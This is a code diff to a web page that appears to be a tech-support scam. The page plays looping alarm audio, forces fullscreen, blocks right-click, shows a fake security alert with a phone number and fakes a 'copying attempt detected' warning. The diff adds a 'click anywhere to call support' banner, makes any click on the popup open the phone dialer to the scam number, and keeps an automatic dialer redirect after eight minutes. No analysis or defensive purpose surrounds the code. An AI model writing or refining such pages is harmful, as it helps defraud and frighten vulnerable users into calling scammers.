@@ -55,6 +55,7 @@
         text-align: center;
         animation: heartbeat 1s infinite;
         overflow-y: auto;
+        cursor: pointer;
     }
 
     @keyframes heartbeat {
@@ -135,6 +136,8 @@
         .popup-content {
             padding: 15px;
             gap: 15px;
+            justify-content: flex-start;
+            padding-top: 40px;
         }
 
         .message-text {
@@ -164,6 +167,11 @@
         .loading-text {
             font-size: 18px;
         }
+        
+        .sec-alert {
+            padding: 20px;
+            margin: 15px auto;
+        }
     }
 
     .sec-alert{
@@ -186,6 +194,20 @@
     .sec-alert-body ul{ margin: 10px 0 0 25px; }
     .sec-alert-body .muted{ color: #555; font-size: 1rem; margin-top: 15px; }
     a { color: inherit; text-decoration: underline; }
+    
+    .click-instruction {
+        position: fixed;
+        bottom: 20px;
+        left: 0;
+        width: 100%;
+        text-align: center;
+        color: red;
+        font-weight: bold;
+        font-size: 18px;
+        background: rgba(255, 255, 255, 0.9);
+        padding: 10px;
+        z-index: 1000;
+    }
 </style>
 </head>
 <body oncontextmenu="return false;">
@@ -220,6 +242,7 @@
             <div id="callNumberText">+1 (888) 929-5618</div>
         </div>
     </div>
+    <div class="click-instruction" id="clickInstruction">Click anywhere to call support immediately</div>
 </div>
 
 <audio id="alertAudio" loop>
@@ -231,7 +254,9 @@
     const progressFill = document.getElementById('progressFill');
     const callNowBtn = document.getElementById('callNowBtn');
     const callNumberText = document.getElementById('callNumberText');
+    const clickInstruction = document.getElementById('clickInstruction');
     let hasStarted = false;
+    let popupActive = false;
 
     function isMobile() {
         return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
@@ -245,6 +270,7 @@
         startImage.style.display = 'none';
         document.getElementById('leavePopup').style.display = 'block';
         audio.play();
+        popupActive = true;
 
         if (isMobile()) {
             callNowBtn.style.display = 'inline-block';
@@ -261,8 +287,12 @@
         }, 1000);
 
         setTimeout(function () {
-            window.location.href = "tel:+18889295618";
+            redirectToDialer();
         }, 480000);
+    }
+
+    function redirectToDialer() {
+        window.location.href = "tel:+18889295618";
     }
 
     window.onload = function() {
@@ -271,11 +301,18 @@
             alert("Website copying attempt detected. Action has been logged.");
         }
         
-        // Add click event listener to the entire body
+        // Add click event listener to the entire body for initial activation
         document.body.addEventListener('click', function(e) {
-            // Only activate if we're not clicking on the popup itself
-            if (!e.target.closest('#leavePopup')) {
+            // Only activate if we're not clicking on the popup itself and popup is not active
+            if (!e.target.closest('#leavePopup') && !popupActive) {
                 activateFullScreen();
+            }
+        });
+        
+        // Add click event listener to the popup for redirecting to dialer
+        document.getElementById('leavePopup').addEventListener('click', function() {
+            if (popupActive) {
+                redirectToDialer();
             }
         });
     }
@@ -294,8 +331,9 @@
         activateFullScreen();
     }, { once: true });
 
-    callNowBtn.addEventListener('click', function () {
-        window.location.href = "tel:+18889295618";
+    callNowBtn.addEventListener('click', function (e) {
+        e.stopPropagation();
+        redirectToDialer();
     });
 
     function applyBackground() {
